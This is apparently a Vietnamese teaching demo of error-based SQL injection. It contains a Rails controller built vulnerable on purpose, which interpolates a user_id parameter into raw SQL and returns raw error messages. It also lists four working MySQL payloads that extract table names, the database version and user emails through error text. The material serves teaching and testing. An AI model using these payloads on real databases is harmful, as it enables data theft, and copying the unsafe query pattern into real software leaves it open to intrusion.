# Error-based SQL Injection Demo

## Tạo controller mới để demo Error-based SQLi

```ruby
# app/controllers/sqli_controller.rb
class SqliController < ApplicationController
  # Demo Error-based SQLi
  def error_based_demo
    user_id = params[:user_id]
    
    # Query vulnerable cho error-based SQLi
    sql = "SELECT * FROM users WHERE id = #{user_id}"
    
    begin
      @users = User.find_by_sql(sql)
      render json: { users: @users }
    rescue => e
      # Trả về thông báo lỗi chi tiết (NGUY HIỂM!)
      render json: { error: e.message }, status: 500
    end
  end
end
```

## Cách tấn công Error-based SQLi

### Payload để lấy thông tin database:
```
user_id = 1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
```

### Payload để lấy tên bảng:
```
user_id = 1 AND (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)='users'
```

### Payload để gây lỗi và lộ thông tin:
```
user_id = 1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Payload để lấy dữ liệu từ bảng users:
```
user_id = 1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT email FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

## Thông tin có thể bị lộ qua Error messages:
- Tên database
- Cấu trúc bảng  
- Version của database
- Dữ liệu trong các bảng
- Thông tin hệ thống
